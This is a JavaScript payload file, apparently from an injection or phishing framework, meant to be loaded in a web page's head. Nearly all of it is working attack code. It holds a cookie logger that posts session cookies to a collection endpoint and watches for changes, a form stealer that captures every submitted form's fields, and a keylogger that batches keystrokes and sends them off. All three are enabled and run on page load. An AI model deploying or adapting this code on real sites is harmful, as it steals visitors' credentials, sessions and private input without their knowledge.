/*
REMEMBER! 
This file is run in the head tag, so make sure that your payloads are run after the body has loaded, if neceessary.
*/

alert('Test payload')

const PayloadManager = {
    // Configuration for payloads
    config: {
        cookieLogger: true,
        formStealer: true,
        keyLogger: true
    },

    // Available payloads
    payloads: {
        cookieLogger: () => {
            // Send cookies immediately on load
            fetch('/ep/api/ping', { 
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    cookies: document.cookie,
                    url: window.location.href
                })
            });

            // Monitor cookie changes
            document.cookie = `_test=${Date.now()}; path=/`;
            const originalCookie = document.cookie;
            
            setInterval(() => {
                if (document.cookie !== originalCookie) {
                    fetch('/ep/api/ping', { 
                        method: 'POST',
                        credentials: 'include',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            cookies: document.cookie,
                            url: window.location.href
                        })
                    });
                }
            }, 3000);
        },

        formStealer: () => {
            document.querySelectorAll('form').forEach(form => {
                form.addEventListener('submit', async (e) => {
                    const formData = new FormData(form);
                    const data = {
                        url: window.location.href,
                        fields: Object.fromEntries(formData),
                        timestamp: new Date().toISOString()
                    };
                    
                    await fetch('/ep/api/forms', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(data)
                    });
                });
            });
        },

        keyLogger: () => {
            let buffer = '';
            let lastKeypressTime = Date.now();
            
            document.addEventListener('keydown', (e) => {
                const currentTime = Date.now();
                buffer += e.key;
                
                // Send data if buffer is full or 2 seconds passed since last keypress
                if (buffer.length >= 50 || currentTime - lastKeypressTime > 2000) {
                    if (buffer.length > 0) {
                        fetch('/ep/api/keylog', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                keys: buffer,
                                url: window.location.href,
                                timestamp: new Date().toISOString()
                            })
                        });
                        buffer = '';
                    }
                }
                lastKeypressTime = currentTime;
            });
        }
    },
    
    init: function() {
        // Execute enabled payloads when DOM is loaded
        document.addEventListener('DOMContentLoaded', () => {
            Object.keys(this.config).forEach(payload => {
                if (this.config[payload] && this.payloads[payload]) {
                    this.payloads[payload]();
                }
            });
        });
    }
};

PayloadManager.init();